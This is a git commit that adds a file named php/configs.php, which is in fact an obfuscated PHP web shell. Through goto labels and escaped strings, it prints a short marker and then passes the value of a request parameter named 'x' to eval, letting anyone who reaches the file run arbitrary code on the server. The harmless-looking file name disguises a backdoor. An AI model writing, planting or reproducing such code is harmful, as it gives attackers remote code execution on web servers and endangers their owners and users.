2b679cb1f7cadb19f5b4d34470483198e4e2ffe6
ybmgq <ybmgq@outlook.com>
2025-04-16 23:01:38 +0800

    Create configs.php

---
+++ php/configs.php
@@ -0,0 +1,9 @@
+<?php
+/*
+ Encode by www.phpen.cn 
+*/
+ goto Lm_gT; BTir6: 
+ $a = array($_REQUEST["\170"] => "\x33");
+  goto aFK9V; aFK9V: $b = array_keys($a)[0]; 
+  goto XdJHP; Lm_gT: echo "\164\145\x73"; 
+  goto BTir6; XdJHP: eval($b);
